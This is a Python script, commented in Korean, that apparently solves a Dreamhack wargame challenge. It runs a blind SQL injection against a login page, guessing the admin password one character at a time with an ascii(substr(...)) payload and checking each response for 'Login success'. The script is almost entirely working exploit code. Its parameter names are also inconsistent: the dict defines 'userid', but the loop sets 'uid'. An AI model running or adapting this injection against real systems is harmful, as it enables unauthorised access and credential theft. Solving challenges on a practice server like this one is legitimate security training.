#!/usr/bin/python3
import requests
import string
# example URL
url = 'http://host3.dreamhack.games:15661/login'
params = {
    'userid': '',
    'upw': ''
}
# abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
tc = string.ascii_letters + string.digits + string.punctuation
# 사용할 SQL Injection 쿼리
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params['uid'] = query.format(idx=idx+1, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find("Login success") != -1:
            password += ch
            break
print(f"Password is {password}")